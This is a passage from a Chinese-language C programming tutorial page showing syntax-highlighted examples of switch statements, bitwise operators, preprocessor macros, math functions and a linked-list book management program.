class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="37"></td><td><pre>    <span class="token keyword">switch</span> <span class="token punctuation">(</span>flag<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="38"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="39"></td><td><pre>    <span class="token keyword">case</span> red<span class="token operator">:</span></pre></td></tr><tr><td data-num="40"></td><td><pre>        <span class="token function">printf</span><span class="token punctuation">(</span>red<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="41"></td><td><pre>        <span class="token keyword">break</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="42"></td><td><pre>    <span class="token keyword">case</span> blue<span class="token operator">:</span></pre></td></tr><tr><td data-num="43"></td><td><pre>        <span class="token function">printf</span><span class="token punctuation">(</span>blue<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="44"></td><td><pre>        <span class="token keyword">break</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="45"></td><td><pre>    <span class="token keyword">case</span> green<span class="token operator">:</span></pre></td></tr><tr><td data-num="46"></td><td><pre>        <span class="token function">printf</span><span class="token punctuation">(</span>green<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="47"></td><td><pre>        <span class="token keyword">break</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="48"></td><td><pre></pre></td></tr><tr><td data-num="49"></td><td><pre>    <span class="token keyword">default</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="50"></td><td><pre>        <span class="token keyword">break</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="51"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="52"></td><td><pre>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="53"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><h2 id="位运算"><a class="anchor" href="#位运算">#</a> 位运算</h2>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token comment">//&amp; | ~ ^ &lt;&lt; >></span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">100</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token keyword">int</span> b <span class="token operator">=</span> <span class="token number">50</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token keyword">int</span> c <span class="token operator">=</span> a <span class="token operator">&amp;</span> b<span class="token punctuation">;</span><span class="token comment">// 与运算</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token keyword">int</span> d <span class="token operator">=</span> a <span class="token operator">|</span> b<span class="token punctuation">;</span><span class="token comment">// 或运算</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span>d<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token keyword">int</span> aa <span class="token operator">=</span> <span class="token operator">~</span>b<span class="token punctuation">;</span><span class="token comment">// 非运算</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span>aa<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token keyword">int</span> bb <span class="token operator">=</span> a <span class="token operator">^</span> b<span class="token punctuation">;</span><span class="token comment">// 异或</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span>bb<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token keyword">int</span> a1 <span class="token operator">=</span> a <span class="token operator">&lt;&lt;</span> <span class="token number">32</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span>a1<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    <span class="token keyword">int</span> b1 <span class="token operator">=</span> a <span class="token operator">>></span> <span class="token number">32</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span>b1<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220111215542664.png" alt="image-20220111215542664" /></p>
<h2 id="c预处理器和c库"><a class="anchor" href="#c预处理器和c库">#</a> C 预处理器和 C 库</h2>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;math.h></span></span></pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">N</span> <span class="token expression"><span class="token number">5</span></span></span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">NUM</span><span class="token expression"><span class="token punctuation">(</span>x<span class="token punctuation">)</span> x<span class="token operator">*</span>x</span></span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">Num</span><span class="token expression"><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token function">printf</span><span class="token punctuation">(</span></span><span class="token string">"what is the number:%d"</span><span class="token expression"><span class="token punctuation">,</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span></span></span></pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">zero</span></span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">SYS</span> <span class="token expression"><span class="token number">2</span></span></span></pre></td></tr><tr><td data-num="12"></td><td><pre></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token comment">//#ifder #else #endif</span></pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span>N<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    <span class="token keyword">int</span> c <span class="token operator">=</span> <span class="token function">NUM</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span>NUM<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    <span class="token function">Num</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre></pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">zero</span></span></pre></td></tr><tr><td data-num="23"></td><td><pre>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"this is def"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="24"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">else</span></span></pre></td></tr><tr><td data-num="25"></td><td><pre>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"this is else"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="26"></td><td><pre></pre></td></tr><tr><td data-num="27"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">if</span> <span class="token expression">SYS <span class="token operator">==</span> <span class="token number">1</span></span></span></pre></td></tr><tr><td data-num="28"></td><td><pre>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="29"></td><td><pre> <span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">elif</span> <span class="token expression">SYS <span class="token operator">==</span> <span class="token number">2</span></span></span></pre></td></tr><tr><td data-num="30"></td><td><pre>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="31"></td><td><pre></pre></td></tr><tr><td data-num="32"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span> <span class="token comment">//SYS == 1</span></span></pre></td></tr><tr><td data-num="33"></td><td><pre></pre></td></tr><tr><td data-num="34"></td><td><pre></pre></td></tr><tr><td data-num="35"></td><td><pre>    <span class="token keyword">int</span> a11 <span class="token operator">=</span> <span class="token function">fabs</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 绝对值</span></pre></td></tr><tr><td data-num="36"></td><td><pre>    <span class="token keyword">int</span> b11 <span class="token operator">=</span> <span class="token function">sqrt</span><span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 平方根</span></pre></td></tr><tr><td data-num="37"></td><td><pre>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="38"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><h2 id="高级数据表示"><a class="anchor" href="#高级数据表示">#</a> 高级数据表示</h2>
<p>图书管理系统</p>
<ol>
<li>定义一个链表结构</li>
<li>实现链表的增删改查</li>
</ol>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">Node</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token keyword">char</span> Bookname<span class="token punctuation">[</span><span class="token number">50</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token keyword">int</span> BookNumber<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token keyword">float</span> BookPrice<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token keyword">struct</span> <span class="token class-name">Node</span> <span class="token operator">*</span>next<span class="token punctuation">;</span><span class="token comment">// 指向下一个节点的指针</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token punctuation">&#125;</span>Node<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre></pre></td></tr><tr><td data-num="13"></td><td><pre>Node <span class="token operator">*</span> <span class="token function">AppendNode</span><span class="token punctuation">(</span>Node <span class="token operator">*</span> head<span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token operator">*</span>Bookname<span class="token punctuation">,</span> <span class="token keyword">int</span> BookNumer<span class="token punctuation">,</span><span class="token keyword">float</span> BookPrice<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    Node <span class="token operator">*</span> pNewNode <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    Node <span class="token operator">*</span> pHeadNode <span class="token operator">=</span> head<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    pNewNode <span class="token operator">=</span> <span class="token punctuation">(</span>Node <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>Node<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span>pNewNode <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"memory malloc failed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span>head <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="24"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>        head <span class="token operator">=</span> pNewNode<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>    <span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>        <span class="token keyword">while</span> <span class="token punctuation">(</span>pHeadNode<span class="token operator">-></span>next <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="29"></td><td><pre>        <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="30"></td><td><pre>            pHeadNode <span class="token operator">=</span> pHeadNode<span class="token operator">-></span>next<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="31"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="32"></td><td><pre>        pHeadNode<span class="token operator">-></span>next <span class="token operator">=</span> pNewNode<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="33"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="34"></td><td><pre>    <span class="token comment">// 书名</span></pre></td></tr><tr><td data-num="35"></td><td><pre>    <span class="token function">strcpy</span><span class="token punctuation">(</span>pNewNode<span class="token operator">-></span>Bookname<span class="token punctuation">,</span>Bookname<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="36"></td><td><pre>    <span class="token comment">// 定价</span></pre></td></tr><tr><td data-num="37"></td><td><pre>    pNewNode<span class="token operator">-></span>BookPrice <span class="token operator">=</span> BookPrice<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="38"></td><td><pre>    <span class="token comment">// 书号</span></pre></td></tr><tr><td data-num="39"></td><td><pre>    pNewNode<span class="token operator">-></span>BookNumber <span class="token operator">=</span> BookNumer<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="40"></td><td><pre>    pNewNode<span class="token operator">-></span>next <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="41"></td><td><pre>    <span class="token keyword">return</span> head<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="42"></td><td><pre>    <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="43"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="44"></td><td><pre></pre></td></tr><tr><td data-num="45"></td><td><pre><span class="token keyword">void</span> <span class="token function">QueryNode</span><span class="token punctuation">(</span>Node <span class="token operator">*</span>head<span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token operator">*</span>Bookname<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="46"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="47"></td><td><pre>    <span class="token keyword">int</span> flag <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="48"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span>head <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="49"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="50"></td><td><pre>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"head == NULL"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="51"></td><td><pre>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="52"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="53"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span>Bookname<span class="token punctuation">,</span>head<span class="token operator">-></span>Bookname<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="54"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="55"></td><td><pre>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"书名：%s\n定价：%f\n书号：%d\n"</span><span class="token punctuation">,</span>head<span class="token operator">-></span>Bookname<span class="token punctuation">,</span>head<span class="token operator">-></span>BookPrice<span class="token punctuation">,</span>head<span class="token operator">-></span>BookNumber<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="56"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="57"></td><td><pre>    <span class="token keyword">while</span> <span class="token punctuation">(</span>head<span class="token operator">-></span>next <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="58"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="59"></td><td><pre>        head <span class="token operator">=</span> head<span class="token operator">-></span>next<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="60"></td><td><pre>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span>Bookname<span class="token punctuation">,</span>head<span class="token operator">-></span>Bookname<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="61"></td><td><pre>        <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="62"></td><td><pre>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"书名：%s\n定价：%f\n书号：%d\n"</span><span class="token punctuation">,</span>head<span class="token operator">-></span>Bookname<span class="token punctuation">,</span>head<span class="token operator">-></span>BookPrice<span class="token punctuation">,</span>head<span class="token operator">-></span>BookNumber<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="63"></td><td><pre>            flag <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="64"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="65"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="66"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span>flag <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="67"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="68"></td><td><pre>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Query failed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="69"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="70"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="71"></td><td><pre></pre></td></tr><tr><td data-num="72"></td><td><pre><span class="token keyword">void</span> <span class="token function">ModeifyNode</span><span class="token punctuation">(</span>Node <span class="token operator">*</span>head<span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token operator">*</span>Bookname<span class="token punctuation">,</span><span class="token keyword">float</span> BookPrice<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="73"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="74"></td><td><pre>    <span class="token keyword">int</span> flag <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="75"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span>head <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="76"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="77"></td><td><pre>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"head == NULL"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="78"></td><td><pre>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="79"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="80"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span>Bookname<span class="token punctuation">,</span>head<span class="token operator">-></span>Bookname<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="81"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="82"></td><td><pre>        head<span class="token operator">-></span>BookPrice <span class="token operator">=</span> BookPrice<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="83"></td><td><pre>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"新定价：%f\n"</span><span class="token punctuation">,</span>head<span class="token operator">-></span>Bookname<span class="token punctuation">,</span>head<span class="token operator">-></span>BookPrice<span class="token punctuation">,</span>head<span class="token operator">-></span>BookNumber<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="84"></td><td><pre>        flag <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="85"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="86"></td><td><pre>    <span class="token keyword">while</span> <span class="token punctuation">(</span>head<span class="token operator">-></span>next <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="87"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="88"></td><td><pre>        head <span class="token operator">=</span> head<span class="token operator">-></span>next<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="89"></td><td><pre>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span>Bookname<span class="token punctuation">,</span>head<span class="token operator">-></span>Bookname<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="90"></td><td><pre>        <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="91"></td><td><pre>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"新定价：%f\n"</span><span class="token punctuation">,</span>head<span class="token operator">-></span>Bookname<span class="token punctuation">,</span>head<span class="token operator">-></span>BookPrice<span class="token punctuation">,</span>head<span class="token operator">-></span>BookNumber<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="92"></td><td><pre>            flag <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="93"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="94"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="95"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span>flag <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="96"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="97"></td><td><pre>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Modify failed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="98"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="99"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="100"></td><td><pre></pre></td></tr><tr><td data-num="101"></td><td><pre>Node <span class="token operator">*</span> <span class="token function">DeleteNode</span><span class="token punctuation">(</span>Node <span class="token operator">*</span>head<span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token operator">*</span>Bookname<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="102"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="103"></td><td><pre>    Node <span class="token operator">*</span>pNode <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="104"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span>head <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="105"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="106"></td><td><pre>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"head == NULL"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="107"></td><td><pre>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="108"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="109"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span>Bookname<span class="token punctuation">,</span>head<span class="token operator">-></span>Bookname<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="110"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="111"></td><td><pre>        <span class="token keyword">if</span><span class="token punctuation">(</span>head<span class="token operator">-></span>next <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="112"></td><td><pre>        <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="113"></td><td><pre>            pNode <span class="token operator">=</span> head<span class="token operator">-></span>next<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="114"></td><td><pre>            <span class="token function">free</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="115"></td><td><pre>            <span class="token keyword">return</span> pNode<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="116"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td 